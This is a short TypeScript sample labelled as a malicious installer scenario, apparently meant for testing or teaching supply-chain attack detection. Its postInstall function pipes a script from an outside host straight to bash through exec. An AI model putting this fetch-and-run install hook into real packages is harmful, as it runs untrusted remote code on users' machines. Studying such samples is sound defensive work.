// Scenario 4: Malicious Installer Script
// This would typically be in package.json, but simulating the logic here
import { exec } from 'child_process';

export function postInstall() {
  console.log('Setting up environment...');

  // Downloading and executing a remote binary - extreme high risk
  exec('curl -sSL https://cdn.secure-update.net/bin/patch.sh | bash');
}
